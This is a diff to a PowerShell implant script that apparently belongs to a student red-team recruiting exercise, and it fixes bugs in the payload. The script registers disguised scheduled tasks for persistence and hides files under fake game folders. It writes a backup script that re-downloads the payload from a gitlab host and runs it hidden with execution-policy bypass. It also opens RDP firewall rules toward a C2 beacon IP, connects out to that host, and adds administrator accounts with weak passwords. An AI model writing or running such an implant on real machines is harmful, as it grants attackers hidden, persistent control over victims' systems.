@@ -1,10 +1,10 @@
 param(
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory=$true)]
     [string]$beaconIPAddress
 )
 
 # Create scheduled task for this payload to run on boot
-New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1"
+$action = New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"
 
@@ -12,10 +12,10 @@ Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionTo
 # The backup script will check to see if the main payload exists.
 # If it doesn't this script will redownload the main payload, and start a new process for it
 if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
-    Make-Directory "C:\Program Files (x86)\Webkinz"
+    New-Item -ItemType "Directory" -Path "C:\Program Files (x86)\Webkinz"
 }
 if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
-    New-Item -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
+    New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
     $backupCommands = "if(!(Test-Path C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1)){"
     $backupCommands += "wget -o C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`""
     $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1 -BeaconIPAddress $($beaconIPAddress)`" -Verb RunAs}"
@@ -23,8 +23,8 @@ if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
 }
 
 # Create Scheduled task for the backup script to check for the main payload every 5 minutes
-New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Webkinz\backup.ps1"
-$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5)
+$action = New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Webkinz\backup.ps1"
+$trigger = New-ScheduledTaskTrigger -Daily -At 9am -RepetitionInterval (New-TimeSpan -Minutes 5)
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackupImportantFiles"
 
 # Set up Firewall rules to make sure the C2 can communicate with the client
@@ -36,18 +36,18 @@ netsh adv f a r n="RDP Default Rule" dir=in act=allow prof=any prot=tcp localpor
 netsh adv f a r n="RDP C2 Rule" dir=out act=allow prof=any prot=tcp remoteip=$beaconIPAddress localport=3389
 
 # Set up TCP connection to the server
-$tcpConnection = New-Object System.Net.Sockets.TcpClient($serverIP, 80)
+$tcpConnection = New-Object System.Net.Sockets.TcpClient($beaconIPAddress, 80)
 $tcpStream = $tcpConnection.GetStream()
 $reader = New-Object System.IO.StreamReader($tcpStream)
 $writer = New-Object System.IO.StreamWriter($tcpStream)
 $writer.AutoFlush = $true
 
 # Add some extra users
-New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456")
+New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText)
 Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
 Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"
 
-New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-12345")
+New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-12345" -AsPlainText)
 Add-LocalGroupMember -Member "Doug" -Group "Administrators"
 Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"
 
